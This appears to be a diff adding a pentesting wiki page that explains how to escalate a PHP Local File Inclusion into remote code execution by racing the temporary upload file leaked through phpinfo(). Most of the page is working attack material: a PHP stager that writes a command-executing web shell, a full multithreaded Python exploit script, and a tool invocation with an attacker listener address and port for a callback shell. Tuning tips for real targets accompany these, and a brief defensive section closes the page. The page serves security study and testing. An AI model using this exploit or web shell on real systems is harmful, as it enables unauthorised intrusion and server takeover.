@@ -1,0 +1,240 @@
+# LFI to RCE via PHPInfo
+
+{{#include ../../banners/hacktricks-training.md}}
+
+To exploit this technique, you need all of the following:
+
+- A reachable page that prints phpinfo() output.
+- A Local File Inclusion (LFI) primitive you control (e.g., include/require on user input).
+- PHP file uploads enabled (`file_uploads = On`). When the web server routes a valid multipart POST to PHP, PHP's RFC 1867 processing creates a temporary file for each accepted upload part before the script runs.<sup>[[2]](#references)</sup>
+- The PHP worker must be able to write to the configured upload_tmp_dir (or default system temp directory) and your LFI must be able to include that path.
+
+Classic write-up and original PoC:
+- Whitepaper: LFI with PHPInfo() Assistance (B. Moore, 2011)
+- Original PoC script name: phpinfolfi.py (see whitepaper and mirrors)<sup>[[1]](#references)</sup>
+
+Tutorial HTB: https://www.youtube.com/watch?v=rs4zEwONzzk&t=600s<sup>[[9]](#references)</sup>
+
+Notes about the original PoC
+- The phpinfo() output is HTML-encoded, so the "=>" arrow often appears as "=&gt;". If you reuse legacy scripts, ensure they search for both encodings when parsing the _FILES[tmp_name] value.
+- You must adapt the payload (your PHP code), REQ1 (the request to the phpinfo() endpoint including padding), and LFIREQ (the request to your LFI sink). Some targets don’t need a null-byte (%00) terminator and modern PHP versions won’t honor it. Adjust the LFIREQ accordingly to the vulnerable sink.
+- Prefer incremental parsing/regex over hard-coded offset math. Modern Python 3 wrappers usually stop as soon as `tmp_name` is complete, which is more robust than assuming a fixed offset or a fixed temp-path length.
+
+Example sed (only if you really use the old Python2 PoC) to match HTML-encoded arrow:
+```
+sed -i 's/\[tmp_name\] =>/\[tmp_name\] =&gt;/g' phpinfolfi.py
+```
+
+{{#file}}
+LFI-With-PHPInfo-Assistance.pdf
+{{#endfile}}
+
+## Theory
+
+- When PHP receives a multipart/form-data POST with a file field, it writes the content to a temporary file (upload_tmp_dir or the OS default) and exposes the path in $_FILES['<field>']['tmp_name']. The file is automatically removed at the end of the request unless moved/renamed.<sup>[[2]](#references)</sup>
+- The trick is to learn the temporary name and include it via your LFI before PHP cleans it up. phpinfo() prints $_FILES, including tmp_name.
+- By inflating request headers/parameters (padding) you can cause early chunks of phpinfo() output to be flushed to the client before the request finishes, so you can read tmp_name while the temp file still exists and then immediately hit the LFI with that path.
+
+In Windows the temp files are commonly under something like C:\\Windows\\Temp\\php*.tmp. In Linux/Unix they are usually in /tmp or the directory configured in upload_tmp_dir.
+
+## What to verify in `phpinfo()` before racing
+
+Before sending thousands of requests, extract the values that decide whether the race is realistic:
+
+- `file_uploads`: must be `On`.
+- `upload_tmp_dir`: if set, this is the directory your LFI must be able to include. If empty, expect the system default temp directory.
+- `upload_max_filesize` and `post_max_size`: the file part plus the full multipart body (payload + MIME boundaries + extra POST fields) must stay below these limits. If the file part exceeds `upload_max_filesize`, expect upload errors or an empty `tmp_name`; if `post_max_size` is exceeded, PHP leaves `$_POST` and `$_FILES` empty, so there is nothing to leak.
+- `max_file_uploads`: classic PoCs usually send one real payload file, but some variants add many junk file parts to bloat the response. If you exceed this limit, PHP silently drops later file parts and the upload you expect to race on may never appear in `$_FILES`.
+- `max_input_time`: very low values can kill slow or heavily padded uploads before you win the race.
+- `enable_post_data_reading`: if `Off`, PHP won’t populate `$_POST`/`$_FILES`, so phpinfo() can be reachable while `tmp_name` never appears.<sup>[[4]](#references)</sup>
+- `open_basedir`: if enabled, your vulnerable include path still needs to be able to reach the temp directory shown in `tmp_name`.
+- `output_buffering`: `4096` is a common/default size and is why many PoCs read in 4KB chunks, but this value can differ.
+- `zlib.output_compression`, `output_handler`, and any framework-level buffering: these reduce the chance of seeing `tmp_name` early enough.
+- `Server API`: useful to decide how much buffering may exist between PHP and you (`apache2handler` is usually easier to reason about than `fpm-fcgi` behind a reverse proxy).
+
+If the page does not show `$_FILES`, make sure you are really sending a `multipart/form-data` request with an actual file part. PHP only populates `tmp_name` for upload fields that were parsed. Also verify the script is not calling `phpinfo()` with flags that omit `INFO_VARIABLES` (for example `phpinfo(INFO_MODULES)`), because that exposes phpinfo without dumping EGPCS/`$_FILES`.<sup>[[3]](#references)</sup>
+
+## Parsing edge cases in modern PHP
+
+- PHP 8.1+ may also show `$_FILES['<field>']['full_path']`. That value is submitted by the browser and may describe a client-side path or directory upload; it is not the server temp file you must include. For this technique, always extract `tmp_name`.
+- If the upload field name is an array (`f[]`) or the browser submits multiple/directory uploads, `tmp_name` can itself be an array. Old regexes that only expect `[tmp_name] => /tmp/phpXXXX` will miss cases like `[tmp_name] => Array ( [0] => /tmp/phpXXXX )`. Either force a single upload field or adapt the parser to grab the first populated array element.
+- PHP 8.4 adds `request_parse_body()`, which can populate `$_POST`/`$_FILES` for `multipart/form-data` requests on verbs such as `PUT` or `PATCH`. The classic phpinfo() race is still usually a `POST`, but if a debug/helper endpoint explicitly calls `request_parse_body()` before `phpinfo()`, the same leak can exist on non-POST routes as well.<sup>[[6]](#references)</sup>
+
+## Attack workflow (step by step)
+
+1) Prepare a tiny PHP payload that persists a shell quickly to avoid losing the race (writing a file is generally faster than waiting for a reverse shell):
+```
+<?php file_put_contents('/tmp/.p.php', '<?php system($_GET["x"]); ?>');
+```
+
+2) Send a large multipart POST directly to the phpinfo() page so it creates a temp file that contains your payload. Inflate various headers/cookies/params with ~5–10KB of padding to encourage early output. Make sure the form field name matches what you’ll parse in $_FILES.
+
+3) While the phpinfo() response is still streaming, parse the partial body to extract $_FILES['<field>']['tmp_name'] (HTML-encoded). As soon as you have the full absolute path (e.g., /tmp/php3Fz9aB), fire your LFI to include that path. If the include() executes the temp file before it is deleted, your payload runs and drops /tmp/.p.php.
+
+4) Use the dropped file: GET /vuln.php?include=/tmp/.p.php&x=id (or wherever your LFI lets you include it) to execute commands reliably.
+
+> Tips
+> - Use multiple concurrent workers to increase your chances of winning the race.
+> - Padding placement that commonly helps: URL parameter, Cookie, User-Agent, Accept-Language, Pragma. Tune per target.
+> - The temporary file does not need a `.php` extension because `include()` parses the included file as PHP. However, if the vulnerable sink **appends** `.php`, the exact temporary path no longer exists; you need a separate suffix-bypass primitive. Modern PHP does not accept `%00` as a generic path terminator.
+
+## Minimal Python 3 PoC (socket-based)
+
+The snippet below focuses on the critical parts and is easier to adapt than the legacy Python2 script. Customize HOST, PHPSCRIPT (phpinfo endpoint), LFIPATH (path to the LFI sink), and PAYLOAD.
+
+```python
+#!/usr/bin/env python3
+import html
+import re
+import socket
+import threading
+from urllib.parse import quote
+
+HOST = 'target.local'
+PORT = 80
+PHPSCRIPT = '/phpinfo.php'
+LFIPATH = '/vuln.php?file=%s'  # sprintf-style where %s will be the tmp path
+THREADS = 10
+
+PAYLOAD = (
+    "<?php echo 'HT_RACE_OK'; "
+    "file_put_contents('/tmp/.p.php', '<?php system($_GET[\"x\"]); ?>'); ?>\r\n"
+)
+BOUND = '---------------------------7dbff1ded0714'
+PADDING = 'A' * 6000
+REQ1_DATA = (f"--{BOUND}\r\n"
+             f"Content-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\r\n"
+             f"Content-Type: text/plain\r\n\r\n{PAYLOAD}\r\n--{BOUND}--\r\n")
+
+REQ1 = (f"POST {PHPSCRIPT}?a={PADDING} HTTP/1.1\r\n"
+        f"Host: {HOST}\r\nCookie: sid={PADDING}; o={PADDING}\r\n"
+        f"User-Agent: {PADDING}\r\nAccept-Language: {PADDING}\r\nPragma: {PADDING}\r\n"
+        f"Content-Type: multipart/form-data; boundary={BOUND}\r\n"
+        f"Content-Length: {len(REQ1_DATA)}\r\n\r\n{REQ1_DATA}")
+
+pat = re.compile(r"\\[tmp_name\\]\\s*=>\\s*([^\\s<]+)")
+
+
+def race_once():
+    s1 = socket.socket()
+    s2 = socket.socket()
+    s1.settimeout(5)
+    s2.settimeout(5)
+    try:
+        s1.connect((HOST, PORT))
+        s2.connect((HOST, PORT))
+        s1.sendall(REQ1.encode())
+        buf = b''
+        tmp = None
+        while len(buf) < 2_000_000:
+            chunk = s1.recv(4096)
+            if not chunk:
+                break
+            buf += chunk
+            decoded = html.unescape(buf.decode(errors='ignore'))
+            m = pat.search(decoded)
+            if m:
+                tmp = m.group(1)
+                break
+        if not tmp:
+            return False
+
+        lfi_path = LFIPATH % quote(tmp, safe='/')
+        req = (f"GET {lfi_path} HTTP/1.1\r\nHost: {HOST}\r\n"
+               "Connection: close\r\n\r\n")
+        s2.sendall(req.encode())
+        response = b''
+        while b'HT_RACE_OK' not in response and len(response) < 1_000_000:
+            chunk = s2.recv(4096)
+            if not chunk:
+                break
+            response += chunk
+        return b'HT_RACE_OK' in response
+    except (OSError, socket.timeout):
+        return False
+    finally:
+        s1.close()
+        s2.close()
+
+if __name__ == '__main__':
+    hit = threading.Event()
+
+    def worker():
+        while not hit.is_set():
+            if not race_once():
+                continue
+            print('[+] Won the race, payload dropped as /tmp/.p.php')
+            hit.set()
+            return
+
+    ts = [threading.Thread(target=worker) for _ in range(THREADS)]
+    [t.start() for t in ts]
+    [t.join() for t in ts]
+```
+
+## Useful public tooling
+
+If you want a ready-made wrapper instead of adapting the minimal PoC, a modern option is `lfito_rce`, which exposes knobs that are commonly needed in real targets (`--phpinfo`, `--threads`, `--end` for suffixes such as `%00`, and multiple payload styles). Treat these wrappers as starting points: check the regex against the raw phpinfo() response and update it if the target prints HTML-encoded arrows, array-style `tmp_name` values, or extra buffering/compression artifacts.<sup>[[8]](#references)</sup>
+
+```bash
+python lfito_rce.py -l 'http://target/lfi.php?file=' -i 'http://target/phpinfo.php' --lhost 10.10.14.2 --lport 4444 -t 16 -e ''
+```
+
+## Troubleshooting
+- You never see tmp_name: Ensure you really POST multipart/form-data to phpinfo(). phpinfo() prints $_FILES only when an upload field was present and the page includes `INFO_VARIABLES`. If the script uses limited flags (for example `phpinfo(INFO_MODULES)`) or `enable_post_data_reading` is `Off`, `tmp_name` won’t appear.
+- `$_FILES` turns empty as soon as you add more body padding: You likely exceeded `post_max_size`. Remember that the multipart body size includes boundaries and extra POST fields, not only the raw payload.
+- The request parses but there is no usable temp file: Check `upload_max_filesize` and the upload error fields; an oversized file part can be rejected even if the overall body stayed below `post_max_size`.
+- `tmp_name` appears only at the very end of the response: This is usually a buffering problem, not a PHP-version problem. Large `output_buffering` values, `zlib.output_compression`, userland output handlers, or reverse-proxy/FastCGI buffering can delay the phpinfo() body until the upload request is almost done.
+- You only get reliable streaming in a lab, not through the real site: A CDN, WAF, or reverse proxy may be buffering the upstream response. If you have multiple routes to the same app, prefer the most direct origin path.
+- The classic 4096-byte offset logic misses the leak: Treat 4096 as a starting point derived from common `output_buffering` defaults, not as a universal constant. Parse incrementally and stop as soon as `tmp_name` is complete.
+- Your parser lands on `full_path` or `[tmp_name] => Array`: Ignore `full_path` (client-supplied metadata) and adapt the parser to extract the first real `tmp_name` value.
+- The temp file is included but your shell dies immediately: Use a tiny stager that writes a second file, because the uploaded temp file will still be deleted when the original request ends.
+- Output doesn’t flush early: Increase padding, add more large headers, or send multiple concurrent requests. Some SAPIs/buffers won’t flush until larger thresholds; adjust accordingly.
+- LFI path blocked by open_basedir or chroot: You must point the LFI to an allowed path or switch to a different LFI2RCE vector.
+- Temp directory not /tmp: phpinfo() prints the full absolute tmp_name path; use that exact path in the LFI.
+
+## Practical notes for modern stacks
+
+- This technique is still reproducible in modern lab environments; for example, Vulhub keeps a demonstrator on PHP 7.2. In practice, success tends to depend more on output buffering and proxying than on a phpinfo-specific patch level.<sup>[[7]](#references)</sup>
+- `flush()` and `implicit_flush` only influence PHP's own output layer. They do not guarantee that a FastCGI gateway, reverse proxy, browser, or intermediary will release partial chunks immediately.<sup>[[5]](#references)</sup>
+- Recent Python 3 wrappers are useful mostly because they parameterize temp directories/request endings and use incremental regex parsing instead of fixed offsets; the exploitation primitive is still the same phpinfo() race.
+- If the target is `fpm-fcgi` behind Nginx/Apache proxying, think in layers: PHP buffer, PHP output handlers/compression, FastCGI buffering, then proxy buffering. The race only works if enough of the phpinfo() response escapes that chain before request shutdown deletes the temp file.
+
+## Defensive notes
+- Never expose phpinfo() in production. If needed, restrict by IP/auth and remove after use.
+- Keep file_uploads disabled if not required. Otherwise, restrict upload_tmp_dir to a path not reachable by include() in the application and enforce strict validation on any include/require paths.
+- Treat any LFI as critical; even without phpinfo(), other LFI→RCE paths exist.
+
+## Related HackTricks techniques
+
+{{#ref}}
+lfi2rce-via-temp-file-uploads.md
+{{#endref}}
+
+{{#ref}}
+via-php_session_upload_progress.md
+{{#endref}}
+
+{{#ref}}
+lfi2rce-via-nginx-temp-files.md
+{{#endref}}
+
+{{#ref}}
+lfi2rce-via-eternal-waiting.md
+{{#endref}}
+
+
+
+## References
+
+- [1] [LFI With PHPInfo() Assistance whitepaper (B. Moore, 2011) – Packet Storm mirror](https://packetstormsecurity.com/files/download/104825/LFI_With_PHPInfo_Assitance.pdf)
+- [2] [PHP Manual – POST method uploads](https://www.php.net/manual/en/features.file-upload.post-method.php)
+- [3] [PHP Manual – `phpinfo()` / `INFO_VARIABLES`](https://www.php.net/manual/en/function.phpinfo.php)
+- [4] [PHP Manual – core `php.ini` directives (`post_max_size`, `enable_post_data_reading`)](https://www.php.net/manual/en/ini.core.php)
+- [5] [PHP Manual – Flushing System Buffers](https://www.php.net/manual/en/outcontrol.flushing-system-buffers.php)
+- [6] [PHP Manual – `request_parse_body()`](https://www.php.net/manual/en/function.request-parse-body.php)
+- [7] [Vulhub – PHP Local File Inclusion RCE with PHPINFO](https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.md)
+- [8] [roughiz – `lfito_rce`](https://github.com/roughiz/lfito_rce)
+- [9] [HTB phpinfo() LFI race condition tutorial (YouTube)](https://www.youtube.com/watch?v=rs4zEwONzzk&t=600s)
+
+{{#include ../../banners/hacktricks-training.md}}
